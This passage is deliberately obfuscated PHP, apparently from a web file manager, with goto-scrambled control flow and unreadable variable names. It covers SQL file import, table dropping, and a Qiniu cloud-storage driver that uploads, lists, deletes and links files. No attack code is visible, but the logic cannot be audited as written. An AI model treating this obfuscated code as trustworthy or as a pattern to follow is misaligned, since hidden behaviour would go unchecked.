$F·Ä¡¹Ì›· = fopen($CİãßÎ”Ç—, $_SERVER[¯Ò¬Èè][989]); goto C®«´”©³õ; fäÄè‘Õ: fclose($F·Ä¡¹Ì›·); return $cÉÍ²âìÜŞ; goto E‰àä –í©; a¾Ş’âŒŠ: if ($f¬¸çÊ×î†) { $f¬¸çÊ×î†->task[$_SERVER[¯Ò¬Èè][987]] = $CÏÏòìÑ¤³; } $Dê°öàÙ¨ = $this->model($CÏÏòìÑ¤³); $cÉÍ²âìÜŞ = 0; goto D§¿Óêâ‘¸; E‰àä –í©: } public function sqlToDb($CºéÉÈÚè, $BŠà‡Ââ÷— = null) { goto DŸèŸùğ–; bÍ×›Áí¬: if (trim($BÕö­¡×ç¢)) { $BÕö­¡×ç¢ = rtrim(trim($BÕö­¡×ç¢), $dëÇ’Æóô¿[67]); if (!$BÂñÓß“˜Î->execute($BÕö­¡×ç¢)) { return !1; } if ($BŠà‡Ââ÷—) { $BŠà‡Ââ÷—->update($D×ÃÚ¸‚òË - 1); } } return !0; goto bÄœÙíğ; DŸèŸùğ–: $dëÇ’Æóô¿ =& $_SERVER[¯Ò¬Èè]; $BÂñÓß“˜Î = $this->model()->db(); $C¡¦÷¾ª£ó = @fopen($CºéÉÈÚè, $dëÇ’Æóô¿[998]); goto d…¤éŠ³©; a©Û›‚‡: $aÇ¼âÛ™¤ = 500 + 1; while (!feof($C¡¦÷¾ª£ó)) { if ($BŠà‡Ââ÷— && $D×ÃÚ¸‚òË != 0) { $BŠà‡Ââ÷—->task[$dëÇ’Æóô¿[985]] += 1; } $D×ÃÚ¸‚òË++; $a¦ÈôŸôƒ = trim(fgets($C¡¦÷¾ª£ó)); $BÕö­¡×ç¢ .= $dëÇ’Æóô¿[50] . $this->sqlDecode($a¦ÈôŸôƒ, $this->type); if ($D×ÃÚ¸‚òË == $aÇ¼âÛ™¤) { $BÕö­¡×ç¢ = rtrim(trim($BÕö­¡×ç¢), $dëÇ’Æóô¿[67]); if (!$BÂñÓß“˜Î->execute($BÕö­¡×ç¢)) { return !1; } if ($BŠà‡Ââ÷—) { $BŠà‡Ââ÷—->update($D×ÃÚ¸‚òË - 1); } $BÕö­¡×ç¢ = $dëÇ’Æóô¿[33]; $D×ÃÚ¸‚òË = 0; } } fclose($C¡¦÷¾ª£ó); goto bÍ×›Áí¬; d…¤éŠ³©: if (!$C¡¦÷¾ª£ó) { return !1; } $D×ÃÚ¸‚òË = 0; $BÕö­¡×ç¢ = $dëÇ’Æóô¿[33]; goto a©Û›‚‡; bÄœÙíğ: } public function dropTable($BĞĞÖù‹³ = null) { $cÎÆµ„ëøî = $this->model()->db(); $d´Ñ´ˆÚò = $BĞĞÖù‹³ ? array($BĞĞÖù‹³) : $cÎÆµ„ëøî->getTables(); if (!$d´Ñ´ˆÚò) { return; } foreach ($d´Ñ´ˆÚò as $BĞĞÖù‹³) { $cÎÆµ„ëøî->execute("\x64\x72\157\160\x20\164\x61\x62\x6c\145\x20\x69\x66\40\145\x78\x69\163\x74\x73\x20\x60{$BĞĞÖù‹³}\140"); } } private function taskToCache($dŸæïĞÁõÇ = null) { $AÖšğ¹–²Ï =& $_SERVER[¯Ò¬Èè]; if (!$dŸæïĞÁõÇ) { return; } $a‚®‚ãÄ¨é = array($AÖšğ¹–²Ï[987] => $dŸæïĞÁõÇ->task[$AÖšğ¹–²Ï[987]], $AÖšğ¹–²Ï[985] => $dŸæïĞÁõÇ->task[$AÖšğ¹–²Ï[985]], $AÖšğ¹–²Ï[999] => $dŸæïĞÁõÇ->task[$AÖšğ¹–²Ï[999]]); if ($a‚®‚ãÄ¨é[$AÖšğ¹–²Ï[985]] == $a‚®‚ãÄ¨é[$AÖšğ¹–²Ï[999]]) { $a‚®‚ãÄ¨é[$AÖšğ¹–²Ï[710]] = 1; } Cache::set($AÖšğ¹–²Ï[1000] . $dŸæïĞÁõÇ->task[$AÖšğ¹–²Ï[367]], $a‚®‚ãÄ¨é); $dŸæïĞÁõÇ->end(); } private function sqlEncode($AÌó¬”ÀËŒ) { $DŠ‘©¸¯ƒ =& $_SERVER[¯Ò¬Èè]; $f­ÉÅ‡”† = array(); foreach ($AÌó¬”ÀËŒ as $aÇ½ Ò‹°) { if (is_array($aÇ½ Ò‹°)) { $aÇ½ Ò‹° = json_encode_force($aÇ½ Ò‹°); } $aÇ½ Ò‹° = addslashes($aÇ½ Ò‹°); $aÇ½ Ò‹° = str_replace(array($DŠ‘©¸¯ƒ[1001], $DŠ‘©¸¯ƒ[217]), array($DŠ‘©¸¯ƒ[1002], $DŠ‘©¸¯ƒ[1003]), $aÇ½ Ò‹°); $f­ÉÅ‡”†[] = str_replace($DŠ‘©¸¯ƒ[55], $DŠ‘©¸¯ƒ[1004], $aÇ½ Ò‹°); } return $DŠ‘©¸¯ƒ[55] . implode($DŠ‘©¸¯ƒ[1005], $f­ÉÅ‡”†) . $DŠ‘©¸¯ƒ[55]; } private function sqlDecode($AÀ‰æò ÄŸ, $Cğ„“¢˜”Š) { $dÆ‰Šğ¥›ë =& $_SERVER[¯Ò¬Èè]; $AÀ‰æò ÄŸ = str_replace(array($dÆ‰Šğ¥›ë[1002], $dÆ‰Šğ¥›ë[1003]), array($dÆ‰Šğ¥›ë[1001], $dÆ‰Šğ¥›ë[217]), $AÀ‰æò ÄŸ); if ($Cğ„“¢˜”Š == $dÆ‰Šğ¥›ë[9]) { $AÀ‰æò ÄŸ = stripslashes($AÀ‰æò ÄŸ); } return $AÀ‰æò ÄŸ; } } goto F»ÑƒÚ«×Ã; AôëåéØÎº: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($fíèìø²Äø) { parent::__construct(); require_once SDK_DIR . $_SERVER[¯Ò¬Èè][1220]; $this->_init($fíèìø²Äø); } public function _init($eİŞÈÓ¥) { foreach ($eİŞÈÓ¥ as $fšõÚ–™–Ó => $eò¨šÍÉ…) { if (isset($this->{$fšõÚ–™–Ó})) { $this->{$fšõÚ–™–Ó} = $eò¨šÍÉ…; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[¯Ò¬Èè][1221], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($f®î„ôÖòß, $DÑŞÙ­›ò = '', $fª“Ç•²¥Ù = REPEAT_RENAME) { if ($this->setContent($f®î„ôÖòß, $DÑŞÙ­›ò)) { return $this->getPathOuter($f®î„ôÖòß); } return !1; } public function mkdir($d¨‘…²ê¢, $c‚šœ‚œš = REPEAT_SKIP) { goto Dä’ØÖ©ÛÕ; Dä’ØÖ©ÛÕ: $FÎ—í³›°Ñ =& $_SERVER[¯Ò¬Èè]; $D‡·‘®Õ¼Ò = trim($d¨‘…²ê¢, $FÎ—í³›°Ñ[8]); if ($this->_isFolder($D‡·‘®Õ¼Ò)) { return $this->getPathOuter($D‡·‘®Õ¼Ò); } goto EŸÎ™Ñå†´; EŸÎ™Ñå†´: $d¨‘…²ê¢ = $D‡·‘®Õ¼Ò . $FÎ—í³›°Ñ[8]; $D½Çœ™¢Ã = get_path_this($D‡·‘®Õ¼Ò); $Aê”ùÌ”°¬ = $d¨‘…²ê¢ . $D½Çœ™¢Ã; goto Eº†Ò•Á«Î; Eº†Ò•Á«Î: if (!$this->mkfile($Aê”ùÌ”°¬)) { return !1; } if (!$this->moveFile($Aê”ùÌ”°¬, $d¨‘…²ê¢)) { $this->delFile($Aê”ùÌ”°¬); return !1; } return $this->getPathOuter($D‡·‘®Õ¼Ò); goto d¹ƒÉ’ê¥; d¹ƒÉ’ê¥: } public function copyFile($EÖ…Ğ©¦×ù, $b§Ì¸ïĞ°é) { $E×‡¢´®½ = $this->bucketManager->copy($this->bucket, $EÖ…Ğ©¦×ù, $this->bucket, $b§Ì¸ïĞ°é, !0); return $E×‡¢´®½ ? !1 : $this->getPathOuter($b§Ì¸ïĞ°é); } public function moveFile($fáöéÖªº, $d§îºƒ©Ş) { $C·¬ĞÕòÒĞ = $this->bucketManager->move($this->bucket, $fáöéÖªº, $this->bucket, $d§îºƒ©Ş, !0); return $C·¬ĞÕòÒĞ ? !1 : $this->getPathOuter($d§îºƒ©Ş); } public function delFile($cöäŒ£¢Ÿ©) { $C¡„Ğ§ã¯Í = $this->bucketManager->delete($this->bucket, $cöäŒ£¢Ÿ©); return $C¡„Ğ§ã¯Í ? !1 : !0; } public function delFolder($AÃèÁ­¨) { $DªˆÔˆË‰³ = $this->fileList($AÃèÁ­¨); if (empty($DªˆÔˆË‰³)) { return !0; } $ağá‡®¢Òä = 1000; if (count($DªˆÔˆË‰³) <= $ağá‡®¢Òä) { return $this->qnDelObj($DªˆÔˆË‰³) ? !1 : !0; } foreach (array_chunk($DªˆÔˆË‰³, $ağá‡®¢Òä) as $eÌŒö“°Ç) { $DÀ°ĞîÏÌ = $this->qnDelObj($eÌŒö“°Ç); if ($DÀ°ĞîÏÌ) { return !1; } } return !0; } private function qnDelObj($fåÑªŸáø§) { $F¥Àå¯­ = $this->bucketManager->buildBatchDelete($this->bucket, $fåÑªŸáø§); list($EÅÍˆàãÁ, $b¾èí‰) = $this->bucketManager->batch($F¥Àå¯­); return $b¾èí‰; } private function fileList($EË•‰º¨ –, $AŸÛ¿­‘£ = 0) { goto c¸„°ôÎÙ®; FËùáÜïÜ: $C…Æ¦§²î¶ = array(); while (!0) { list($c¬™¾Ãï˜½, $Dõ–®Ó’¡) = $this->bucketManager->listFiles($this->bucket, $aéÈôÏÙÄç, $E‹Æİ«ã‡à, $eÁ†ô¨óÑ, $cÛ¸ÕÅ°); if ($Dõ–®Ó’¡) { return !1; } $E‹Æİ«ã‡à = array_key_exists($e³­Èì‰Œ[1191], $c¬™¾Ãï˜½) ? $E‹Æİ«ã‡à = $c¬™¾Ãï˜½[$e³­Èì‰Œ[1222]] : $e³­Èì‰Œ[33]; foreach ($c¬™¾Ãï˜½[$e³­Èì‰Œ[1223]] as $b­“¯êªõô) { $a©ŠÔº†Ã¿ = $b­“¯êªõô[$e³­Èì‰Œ[89]]; if ($AŸÛ¿­‘£) { $a©ŠÔº†Ã¿ = array($e³­Èì‰Œ[28] => $a©ŠÔº†Ã¿, $e³­Èì‰Œ[77] => $b­“¯êªõô[$e³­Èì‰Œ[1224]]); } $C…Æ¦§²î¶[] = $a©ŠÔº†Ã¿; } if ($E‹Æİ«ã‡à == $e³­Èì‰Œ[33]) { break; } } return $C…Æ¦§²î¶; goto aºÒê¥÷¾; CÃ£­Àòõ¸: $E‹Æİ«ã‡à = $e³­Èì‰Œ[33]; $eÁ†ô¨óÑ = 1000; $cÛ¸ÕÅ° = $e³­Èì‰Œ[33]; goto FËùáÜïÜ; c¸„°ôÎÙ®: $e³­Èì‰Œ =& $_SERVER[¯Ò¬Èè]; $EË•‰º¨ – = trim($EË•‰º¨ –, $e³­Èì‰Œ[8]); $aéÈôÏÙÄç = empty($EË•‰º¨ –) ? $e³­Èì‰Œ[33] : $EË•‰º¨ – . $e³­Èì‰Œ[8]; goto CÃ£­Àòõ¸; aºÒê¥÷¾: } public function rename($DŸÎãêÍë, $aÈä…™®¾) { return $this->renameObject($DŸÎãêÍë, $aÈä…™®¾); } public function fileInfo($a¢ê„–¹Ùò, $f‡‘ƒÚİ = false, $B“Ÿ¤‰ÆÈ¸ = array()) { goto eï¨ŒßÁìê; FÍÁÙ­Ñ‘¯: if (empty($B“Ÿ¤‰ÆÈ¸)) { $B“Ÿ¤‰ÆÈ¸ = $this->objectMeta($a¢ê„–¹Ùò); if (!$B“Ÿ¤‰ÆÈ¸) { return $f ƒ£Æªº¡; } } if (isset($B“Ÿ¤‰ÆÈ¸[$Dó‚‡·îºÕ[1225]])) { $f ƒ£Æªº¡[$Dó‚‡·îºÕ[187]] = $B“Ÿ¤‰ÆÈ¸[$Dó‚‡·îºÕ[1225]]; } if (isset($B“Ÿ¤‰ÆÈ¸[$Dó‚‡·îºÕ[1224]])) { $f ƒ£Æªº¡[$Dó‚‡·îºÕ[77]] = $B“Ÿ¤‰ÆÈ¸[$Dó‚‡·îºÕ[1224]]; } goto aíšÑ×†îñ; eï¨ŒßÁìê: $Dó‚‡·îºÕ =& $_SERVER[¯Ò¬Èè]; if ($f‡‘ƒÚİ) { return array($Dó‚‡·îºÕ[28] => $this->pathThis($a¢ê„–¹Ùò), $Dó‚‡·îºÕ[75] => $this->getPathOuter($Dó‚‡·îºÕ[8] . $a¢ê„–¹Ùò), $Dó‚‡·îºÕ[29] => $Dó‚‡·îºÕ[167], $Dó‚‡·îºÕ[77] => isset($B“Ÿ¤‰ÆÈ¸[$Dó‚‡·îºÕ[1224]]) ? $B“Ÿ¤‰ÆÈ¸[$Dó‚‡·îºÕ[1224]] : 0, $Dó‚‡·îºÕ[160] => $this->ext($a¢ê„–¹Ùò)); } $f ƒ£Æªº¡ = array($Dó‚‡·îºÕ[28] => $this->pathThis($a¢ê„–¹Ùò), $Dó‚‡·îºÕ[75] => $this->getPathOuter($Dó‚‡·îºÕ[8] . $a¢ê„–¹Ùò), $Dó‚‡·îºÕ[29] => $Dó‚‡·îºÕ[167], $Dó‚‡·îºÕ[187] => 0, $Dó‚‡·îºÕ[107] => 0, $Dó‚‡·îºÕ[77] => 0, $Dó‚‡·îºÕ[160] => $this->ext($a¢ê„–¹Ùò), $Dó‚‡·îºÕ[188] => !0, $Dó‚‡·îºÕ[189] => !0); goto FÍÁÙ­Ñ‘¯; aíšÑ×†îñ: return $f ƒ£Æªº¡; goto cÑÍæÕ—ÛŸ; cÑÍæÕ—ÛŸ: } public function folderInfo($b¥‚°ƒ³¶¸, $EÅ´Ã±Ş® = false) { goto F‚ù¥±¾½ƒ; F‚ù¥±¾½ƒ: $Fù½Óˆê¯ç =& $_SERVER[¯Ò¬Èè]; if ($EÅ´Ã±Ş®) { return array($Fù½Óˆê¯ç[28] => $this->pathThis($b¥‚°ƒ³¶¸), $Fù½Óˆê¯ç[75] => $this->getPathOuter($Fù½Óˆê¯ç[8] . $b¥‚°ƒ³¶¸), $Fù½Óˆê¯ç[29] => $Fù½Óˆê¯ç[76]); } $BĞ´òó«ì¹ = array($Fù½Óˆê¯ç[28] => $this->pathThis($b¥‚°ƒ³¶¸), $Fù½Óˆê¯ç[75] => $this->getPathOuter($Fù½Óˆê¯ç[8] . $b¥‚°ƒ³¶¸), $Fù½Óˆê¯ç[29] => $Fù½Óˆê¯ç[76], $Fù½Óˆê¯ç[187] => 0, $Fù½Óˆê¯ç[107] => 0, $Fù½Óˆê¯ç[1170] => !0, $Fù½Óˆê¯ç[1171] => !0); goto F“ÑÅŞÌŒ; F“ÑÅŞÌŒ: $b¥‚°ƒ³¶¸ = rtrim($b¥‚°ƒ³¶¸, $Fù½Óˆê¯ç[8]) . $Fù½Óˆê¯ç[8]; $BÇ‹ãÀñƒù = $this->objectMeta($b¥‚°ƒ³¶¸); if (isset($BÇ‹ãÀñƒù[$Fù½Óˆê¯ç[1225]])) { $BĞ´òó«ì¹[$Fù½Óˆê¯ç[187]] = $BÇ‹ãÀñƒù[$Fù½Óˆê¯ç[1225]]; } goto DØâÓ¡¾‰; DØâÓ¡¾‰: return $BĞ´òó«ì¹; goto AØŒÑ½¶³º; AØŒÑ½¶³º: } public function listPath($D¿‡¢‡êâğ, $AøŸ™±êõ = false) { goto bá¡Â÷†ƒŠ; fŠ°›¡ÉçÆ: $d¯¯Ùêº¢Ú = $e÷ï›îÛ•Ì[33]; $a¾È¼ÄçÛ = 1000; $A¾éƒ£àòÔ = $e÷ï›îÛ•Ì[8]; goto AÊŸäÌ—öÁ; AÊŸäÌ—öÁ: $D‘œ†‹òöĞ = $E„°ÍÔØ¿ = array(); while (!0) { list($Cˆ—§ƒ†Î, $c®«³·Ã) = $this->bucketManager->listFiles($this->bucket, $d§ã½æ», $d¯¯Ùêº¢Ú, $a¾È¼ÄçÛ, $A¾éƒ£àòÔ); if ($c®«³·Ã) { return !1; } $d¯¯Ùêº¢Ú = array_key_exists($e÷ï›îÛ•Ì[1191], $Cˆ—§ƒ†Î) ? $d¯¯Ùêº¢Ú = $Cˆ—§ƒ†Î[$e÷ï›îÛ•Ì[1222]] : $e÷ï›îÛ•Ì[33]; if (isset($Cˆ—§ƒ†Î[$e÷ï›îÛ•Ì[1226]])) { foreach ($Cˆ—§ƒ†Î[$e÷ï›îÛ•Ì[1226]] as $cŞÁ ˆ£) { if ($cŞÁ ˆ£ == $d§ã½æ») { continue; } $D‘œ†‹òöĞ[] = $this->folderInfo($cŞÁ ˆ£, $AøŸ™±êõ); } } if (isset($Cˆ—§ƒ†Î[$e÷ï›îÛ•Ì[1223]])) { foreach ($Cˆ—§ƒ†Î[$e÷ï›îÛ•Ì[1223]] as $DÑ´ĞÓ™¶ä) { if ($DÑ´ĞÓ™¶ä[$e÷ï›îÛ•Ì[89]] == $d§ã½æ») { continue; } $E„°ÍÔØ¿[] = $this->fileInfo($DÑ´ĞÓ™¶ä[$e÷ï›îÛ•Ì[89]], $AøŸ™±êõ, $DÑ´ĞÓ™¶ä); } } if ($d¯¯Ùêº¢Ú == $e÷ï›îÛ•Ì[33]) { break; } } return array($e÷ï›îÛ•Ì[74] => $D‘œ†‹òöĞ, $e÷ï›îÛ•Ì[73] => $E„°ÍÔØ¿); goto cª¢ğ”—Ñğ; bá¡Â÷†ƒŠ: $e÷ï›îÛ•Ì =& $_SERVER[¯Ò¬Èè]; $D¿‡¢‡êâğ = trim($D¿‡¢‡êâğ, $e÷ï›îÛ•Ì[8]); $d§ã½æ» = empty($D¿‡¢‡êâğ) ? $e÷ï›îÛ•Ì[33] : $D¿‡¢‡êâğ . $e÷ï›îÛ•Ì[8]; goto fŠ°›¡ÉçÆ; cª¢ğ”—Ñğ: } public function has($b®ƒ˜ŞøÖ×, $FâÄ…ÆÑ“ = false, $BÁÛáÉÕ–ç = true) { goto F×ë ÷ÑÊ; F×ë ÷ÑÊ: $b‡›–ƒô– =& $_SERVER[¯Ò¬Èè]; $b®ƒ˜ŞøÖ× = trim($b®ƒ˜ŞøÖ×, $b‡›–ƒô–[8]); $fè †›ğç = empty($b®ƒ˜ŞøÖ×) ? $b‡›–ƒô–[33] : $b®ƒ˜ŞøÖ× . $b‡›–ƒô–[8]; goto a»¬¿Ä¸Äé; a»¬¿Ä¸Äé: $aÌ—Ïƒ§ãÅ = $b‡›–ƒô–[33]; $C¯°ºĞ„ã« = 1000; $BŸ¼¡àø»¯ = $b‡›–ƒô–[8]; goto fÓ¡²„ÎÔ»; aÎ‰”§å˜à: if ($FâÄ…ÆÑ“) { return array($b‡›–ƒô–[191] => $F•Â™‹Ğƒë, $b‡›–ƒô–[192] => $D£ªë»‰ƒŠ); } return !1; goto Fâ›ï÷¾å¸; fÓ¡²„ÎÔ»: $F•Â™‹Ğƒë = 0; $D£ªë»‰ƒŠ = 0; while (!0) { list($c«˜¤Ûğï, $e‰ïÓñÆ¾ë) = $this->bucketManager->listFiles($this->bucket, $fè †›ğç, $aÌ—Ïƒ§ãÅ, $C¯°ºĞ„ã«, $BŸ¼¡àø»¯); if ($e‰ïÓñÆ¾ë) { return !1; } $aÌ—Ïƒ§ãÅ = array_key_exists($b‡›–ƒô–[1191], $c«˜¤Ûğï) ? $aÌ—Ïƒ§ãÅ = $c«˜¤Ûğï[$b‡›–ƒô–[1222]] : $b‡›–ƒô–[33]; if ($FâÄ…ÆÑ“) { if (!empty($c«˜¤Ûğï[$b‡›–ƒô–[1223]])) { $F•Â™‹Ğƒë += count($c«˜¤Ûğï[$b‡›–ƒô–[1223]]); } if (!empty($c«˜¤Ûğï[$b‡›–ƒô–[1226]])) { $D£ªë»‰ƒŠ += count($c«˜¤Ûğï[$b‡›–ƒô–[1226]]); } if ($aÌ—Ïƒ§ãÅ === $b‡›–ƒô–[33]) { break; } continue; } if ($BÁÛáÉÕ–ç) { if (!empty($c«˜¤Ûğï[$b‡›–ƒô–[1223]])) { return !0; } } else { if (!empty($c«˜¤Ûğï[$b‡›–ƒô–[1226]])) { return !0; } } if ($aÌ—Ïƒ§ãÅ == $b‡›–ƒô–[33]) { break; } } goto aÎ‰”§å˜à; Fâ›ï÷¾å¸: } public function listAll($EˆŞºĞˆÂ) { $A”Şµ‹³‚Ö =& $_SERVER[¯Ò¬Èè]; $c„Ùöº‘ = $this->fileList($EˆŞºĞˆÂ, 1); $F¦‰ÀÓâ = array(); foreach ($c„Ùöº‘ as $AŒÓÇ–„Òª) { $F¦‰ÀÓâ[$AŒÓÇ–„Òª[$A”Şµ‹³‚Ö[28]]] = $AŒÓÇ–„Òª[$A”Şµ‹³‚Ö[77]]; } return $this->listAllFiles($EˆŞºĞˆÂ, array_keys($F¦‰ÀÓâ), $F¦‰ÀÓâ); } public function canRead($E“êéãİ‹») { return $this->exist($E“êéãİ‹») ? !0 : !1; } public function canWrite($A‰„ëŞéé) { return $this->exist($A‰„ëŞéé) ? !0 : !1; } public function getContent($EÏ®Â‘õ›Ö) { return $this->fileSubstr($EÏ®Â‘õ›Ö, 0, -1); } public function setContent($BÚí¬œà‡, $c”§”Ø› = '') { $béÆ“”–‡ = $this->tempFile($this->pathThis($BÚí¬œà‡)); file_put_contents($béÆ“”–‡, $c”§”Ø›); if ($this->upload($BÚí¬œà‡, $béÆ“”–‡)) { $this->tempFileRemve($béÆ“”–‡); return !0; } return !1; } public function refreshUrls($eôŸ¸²é‹á) { goto f¿œ©Á‡Ş; eÁŒš¨”´Ÿ: return $F¬Òâ´š©æ[$C¶ÇƒÁÀÂğ[1227]] == $C¶ÇƒÁÀÂğ[710] ? !0 : !1; goto Aˆ³ÇÌ“ğÁ; døº–İè: $fÛêŠÜµå = new Qiniu\Cdn\CdnManager($this->auth); list($F¬Òâ´š©æ, $E˜Ş‰³Ğ) = $fÛêŠÜµå->refreshUrls($aĞ«³Ì¼ã); if ($E˜Ş‰³Ğ) { return !1; } goto eÁŒš¨”´Ÿ; f¿œ©Á‡Ş: $C¶ÇƒÁÀÂğ =& $_SERVER[¯Ò¬Èè]; $aĞ«³Ì¼ã = array(); if (is_array($eôŸ¸²é‹á)) { foreach ($eôŸ¸²é‹á as $F¾Æ¾½Å­») { $aĞ«³Ì¼ã[] = $this->link($F¾Æ¾½Å­»); } } else { $aĞ«³Ì¼ã[] = $this->link($eôŸ¸²é‹á); } goto døº–İè; Aˆ³ÇÌ“ğÁ: } public function fileSubstr($c¥Ñ‘²Ş¦, $F¾‚ËÎƒ²ã, $fÜñ»“˜) { $AªÓ»à½¸Ê =& $_SERVER[¯Ò¬Èè]; if (!($E§‘íµÊº = $this->link($c¥Ñ‘²Ş¦))) { return !1; } $fˆ‹­ã¹º¦ = !1; if ($fÜñ»“˜ > 0) { $E‚…ğÊÏä = $F¾‚ËÎƒ²ã + $fÜñ»“˜ - 1; $fˆ‹­ã¹º¦ = array($AªÓ»à½¸Ê[1228] . $F¾‚ËÎƒ²ã . $AªÓ»à½¸Ê[412] . $E‚…ğÊÏä); } $fñºƒóäèµ = url_request($E§‘íµÊº, $AªÓ»à½¸Ê[216], !1, $fˆ‹­ã¹º¦); return $fñºƒóäèµ[$AªÓ»à½¸Ê[703]] ? $fñºƒóäèµ[$AªÓ»à½¸Ê[1043]] : !1; } public function upload($e»²‚ì¦’´, $e³›‘ï¡Ñ, $AğÖêë–¨ = false, $A»‡¦’¢ = REPEAT_REPLACE) { $eõ¬Û¾Ë† = new Qiniu\Storage\UploadManager(); $fˆÙÓÃÒ•Î = $this->auth->uploadToken($this->bucket, $e»²‚ì¦’´); $bÃö´“¾åŠ = get_file_mime(get_path_ext($e³›‘ï¡Ñ)); list($eÄøç™èâ, $FùŒ¯¹…²) = $eõ¬Û¾Ë†->putFile($fˆÙÓÃÒ•Î, $e»²‚ì¦’´, $e³›‘ï¡Ñ, null, $bÃö´“¾åŠ); return $FùŒ¯¹…² ? !1 : $this->getPathOuter($e»²‚ì¦’´); } public function uploadFormData($dÊŠÎ·ÉÎ¹, $C¬É‰ƒ… = 3600) { return $this->uploadToken($dÊŠÎ·ÉÎ¹, $C¬É‰ƒ…); } public function multiUploadFormData($cŸ‹„–í½, $cİñ¸¯¤ = 3600) { return $this->uploadToken($cŸ‹„–í½, $cİñ¸¯¤); } private function uploadToken($b­§¶Û¯‹, $CÎ™¯İŠˆ = 3600) { goto D®î†ğ†Ä; DÕÓ¸ŠÂİ: $f”óµÖæàä = http_type() . "\72\57\x2f\165\160\154\157\x61\x64{$e¨Šˆ°â¨÷}\56\161\x69\x6e\x69\x75\160\x2e\143\x6f\x6d\x2f"; return array($b¤½Åé³›‘[1232] => $bˆÒ±¼¥Üç, $b¤½Åé³›‘[1233] => $f”óµÖæàä); goto a÷£¯ğ‚ë; D®î†ğ†Ä: $b¤½Åé³›‘ =& $_SERVER[¯Ò¬Èè]; $BÄ¼¦ƒÈ¬á = $CÎ™¯İŠˆ; $fì‡ÍÛç²¬ = array($b¤½Åé³›‘[1229] => $b¤½Åé³›‘[1230]); goto a§«¹”Æ÷; a§«¹”Æ÷: $Cøßß²´ìö = null; $bˆÒ±¼¥Üç = $this->auth->uploadToken($this->bucket, $Cøßß²´ìö, $BÄ¼¦ƒÈ¬á, $fì‡ÍÛç²¬, !0); $e¨Šˆ°â¨÷ = empty($this->region) || $this->region == $b¤½Åé³›‘[1231] ? $b¤½Åé³›‘[33] : $b¤½Åé³›‘[412] . $this->region; goto DÕÓ¸ŠÂİ; a÷£¯ğ‚ë: } public function download($fÙ·š¥“À, $A‹Ö¸±Ğ½Œ) { goto DœÂ…ùŒ£; eÑÍ‰ËÜÀ‚: $BóïŒ™áã = 1024 * 200; $EÂÂ«Ö® = fopen($B•…ï‹ÍİÈ, $_SERVER[¯Ò¬Èè][1234]); while (!0) { $cŞŸ½©ßÚ¼ = $this->fileSubstr($fÙ·š¥“À, $a´±â¹ÑÜÔ, $BóïŒ™áã); if ($cŞŸ½©ßÚ¼ === !1) { return !1; } fwrite($EÂÂ«Ö®, $cŞŸ½©ßÚ¼); $a´±â¹ÑÜÔ += $BóïŒ™áã; if (strlen($cŞŸ½©ßÚ¼) < $BóïŒ™áã) { break; } } goto DÎ¥ÊµäÁ«; DœÂ…ùŒ£: $B•…ï‹ÍİÈ = IO::getPathInner(IO::mkfile($A‹Ö¸±Ğ½Œ)); if (!($DÏ¸°â¨º¢ = $this->link($fÙ·š¥“À))) { return !1; } $a´±â¹ÑÜÔ = 0; goto eÑÍ‰ËÜÀ‚; DÎ¥ÊµäÁ«: fclose($EÂÂ«Ö®); return $A‹Ö¸±Ğ½Œ; goto F¾î—½ÀÚ®; F¾î—½ÀÚ®: } public function link($eøñ×œá, $C¥å ¶Á–– = '') { if (!$this->isFile($eøñ×œá)) { return !1; } $cìİÅ’œ‘˜ = $this->getHost() . $_SERVER[¯Ò¬Èè][8] . $this->pathEncode($eøñ×œá) . $C¥å ¶Á––; return $this->auth->privateDownloadUrl($cìİÅ’œ‘˜, 3600 * 12); } public function fileOut($D­ã‡—, $AÒíÖºñ = false, $aÓ¬´Ä¢™ = false, $E¤­µôï¥à = '') { $AçŞÚŒÊë =& $_SERVER[¯Ò¬Èè]; if (!$aÓ¬´Ä¢™) { $aÓ¬´Ä¢™ = $this->pathThis($D­ã‡—); } $a‹öìÂÍÉ‹ = $AÒíÖºñ ? $AçŞÚŒÊë[1235] . rawurlencode($aÓ¬´Ä¢™) : $AçŞÚŒÊë[33]; $d®éÂš³î = $this->link($D­ã‡—, $a‹öìÂÍÉ‹); $this->fileOutLink($d®éÂš³î); } public function fileOutServer($F¯Æ¤‰åõñ, $Eá”£ÎÍ¥Û = false, $bÖ¢Ã‹¤…ë = false, $f‘˜¸¢ˆ¿ = '') { parent::fileOut($F¯Æ¤‰åõñ, $Eá”£ÎÍ¥Û, $bÖ¢Ã‹¤…ë, $f‘˜¸¢ˆ¿); } public function fileOutImage($cĞÉ¤½ÅÜ, $cáƒ¸çæ˜÷ = 250) { $eÆÕ‡ˆ¼çÒ = $this->link($cĞÉ¤½ÅÜ, $_SERVER[¯Ò¬Èè][1236] . $cáƒ¸çæ˜÷); $this->fileOutLink($eÆÕ‡ˆ¼çÒ); } public function fileOutImageServer($fÒéî‘±öÒ, $Fµ±ìäÄ®’ = 250) { parent::fileOutImage($fÒéî‘±öÒ, $Fµ±ìäÄ®’); } public function hashMd5($a”Šëƒº˜Ñ) { $dØ¨”ø­–† =& $_SERVER[¯Ò¬Èè]; $e¯é”êäŠ = $this->objectMeta($a”Šëƒº˜Ñ); return isset($e¯é”êäŠ[$dØ¨”ø­–†[196]]) ? $e¯é”êäŠ[$dØ¨”ø­–†[196]] : !1; $E‘Ëµ¥“¹¸ = $this->link($a”Šëƒº˜Ñ, $dØ¨”ø­–†[1237]); } public function size($CÉÄË—ùÏ) { $Aœ¶Œ…áË› = $this->objectMeta($CÉÄË—ùÏ); return $Aœ¶Œ…áË› ? $Aœ¶Œ…áË›[$_SERVER[¯Ò¬Èè][77]] : 0; } public function info($bõÄ«×·ó¡) { if ($this->isFolder($bõÄ«×·ó¡)) { return $this->folderInfo($bõÄ«×·ó¡); } else { if ($this->isFile($bõÄ«×·ó¡)) { return $this->fileInfo($bõÄ«×·ó¡); } } return !1; } public function exist($f„¸­ÃÁ’Ô) { return $this->isFile($f„¸­ÃÁ’Ô) || 